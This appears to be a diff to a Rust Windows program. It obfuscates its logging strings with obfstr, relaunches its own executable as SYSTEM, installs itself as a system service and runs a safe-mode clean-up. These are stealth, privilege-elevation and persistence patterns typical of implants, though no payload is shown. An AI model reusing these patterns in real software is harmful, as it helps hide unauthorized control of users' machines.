@@ -11,7 +11,12 @@ use shared::{
     utils::{
         anti_tampering::is_clean,
         config::load_mib_config,
-        functions::{ exit_1, is_running_from_system32 },
+        functions::{
+            exit_1,
+            get_current_exe,
+            is_running_from_system32,
+            try_spawn_program_as_system,
+        },
     },
 };
 use windows_service_detector::is_running_as_windows_service;
@@ -32,7 +37,7 @@ macro_rules! log_internal {
         {
         match &*$crate::LOGGER.lock().unwrap() {
             Some(logger) => {
-                logger.clone().log($level, s!($s));
+                logger.clone().log($level, obfstr::obfstr!($s));
                 // println!("{:#?}",$s);
             }
             None => {}
@@ -48,7 +53,7 @@ macro_rules! log_internal {
         {
             match &*$crate::LOGGER.lock().unwrap() {
                 Some(logger) => {
-                logger.clone().log($level, &format!("{}{:#?}", s!($fmt), $($arg)*));
+                logger.clone().log($level, &format!("{}{:#?}", obfstr::obfstr!($fmt), $($arg)*));
                 // println!("{}{:#?}", $fmt, $($arg)*);
             }
             None => {}
@@ -59,56 +64,56 @@ macro_rules! log_internal {
 #[macro_export]
 macro_rules! info {
     ($s:expr) => {
-        crate::log_internal!(s!("INFO"), $s)
+        crate::log_internal!(obfstr::obfstr!("INFO"), $s)
     };
     (
         $fmt:expr,
         $($arg:tt)*
     ) => {
-        $crate::log_internal!(s!("INFO"), $fmt, $($arg)*)
+        $crate::log_internal!(obfstr::obfstr!("INFO"), $fmt, $($arg)*)
     };
 }
 #[macro_export]
 macro_rules! warn {
     ($s:expr) => {
-        $crate::log_internal!(s!("WARN"), $s)
+        $crate::log_internal!(obfstr::obfstr!("WARN"), $s)
     };
     (
         $fmt:expr,
         $($arg:tt)*
     ) => {
-        $crate::log_internal!(s!("WARN"), $fmt, $($arg)*)
+        $crate::log_internal!(obfstr::obfstr!("WARN"), $fmt, $($arg)*)
     };
 }
 #[macro_export]
 macro_rules! err {
     ($s:expr) => {
-        $crate::log_internal!(s!("ERROR"), $s)
+        $crate::log_internal!(obfstr::obfstr!("ERROR"), $s)
     };
     (
         $fmt:expr,
         $($arg:tt)*
     ) => {
-           $crate::log_internal!(s!("ERROR"), $fmt, $($arg)*
+           $crate::log_internal!(obfstr::obfstr!("ERROR"), $fmt, $($arg)*
         )
     };
 }
 #[macro_export]
 macro_rules! verbose {
     ($s:expr) => {
-        $crate::log_internal!(s!("VERBOSE"), $s)
+        $crate::log_internal!(obfstr::obfstr!("VERBOSE"), $s)
     };
     (
         $fmt:expr,
         $($arg:tt)*
     ) => {
-        $crate::log_internal!(s!("VERBOSE"), $fmt, $($arg)*)
+        $crate::log_internal!(obfstr::obfstr!("VERBOSE"), $fmt, $($arg)*)
     };
 }
 #[macro_export]
 macro_rules! tag {
     ($s:expr) => {
-        $crate::log_internal!(s!("TAG"), $s)
+        $crate::log_internal!(obfstr::obfstr!("TAG"), $s)
     };
 }
 
@@ -136,46 +141,47 @@ fn main() {
         err!("is_running_as_windows_service Error, assuming true:", error);
         true
     });
+    if is_safe_mode() {
+        let is_system = is_system().unwrap_or_else(|error| {
+            err!("is_system Error, assuming false: ", error);
+            false
+        });
+        if is_system {
+            tag!("CLEANUP");
+            if let Err(error) = clean_up() {
+                err!("clean_up Error: ", error);
+                safemode_fail_safe();
+            }
+            exit_1();
+        }
+    }
     if is_service {
         if let Err(error) = start_service() {
             err!("start_service Error: ", error);
         }
     } else {
-        if is_safe_mode() {
+        if is_running_from_system_dir {
             let is_system = is_system().unwrap_or_else(|error| {
                 err!("is_system Error, assuming false: ", error);
                 false
             });
             if is_system {
-                tag!("CLEANUP");
-                if let Err(error) = clean_up() {
-                    err!("clean_up Error: ", error);
-                    safemode_fail_safe();
+                tag!("SYS-SERVICE-INSTALL");
+
+                if let Err(error) = install_system_service() {
+                    err!("install_system_service Error: ", error);
+                }
+            } else {
+                tag!("LAUNCH-SYS-SERVICE-INSTALL");
+                if
+                    let Err(error) = try_spawn_program_as_system(
+                        get_current_exe().unwrap().to_str().unwrap(),
+                        None
+                    )
+                {
+                    err!("try_spawn_program_as_system Error: ", error);
                 }
             }
-        }
-        if is_running_from_system_dir {
-            // let is_system = is_system().unwrap_or_else(|error| {
-            //     err!("is_system Error, assuming false: ", error);
-            //     false
-            // });
-            // if is_system {
-            tag!("SYS-SERVICE-INSTALL");
-
-            if let Err(error) = install_system_service() {
-                err!("install_system_service Error: ", error);
-            }
-            // } else {
-            //     tag!("LAUNCH-SYS-SERVICE-INSTALL");
-            //     if
-            //         let Err(error) = try_spawn_program_as_system(
-            //             get_current_exe().to_str().unwrap(),
-            //             None
-            //         )
-            //     {
-            //         err!("try_spawn_program_as_system Error: ", error);
-            //     }
-            // }
         } else if !mib_config.cln_up_done {
             tag!("INITIAL-SERVICE-INSTALL");
 
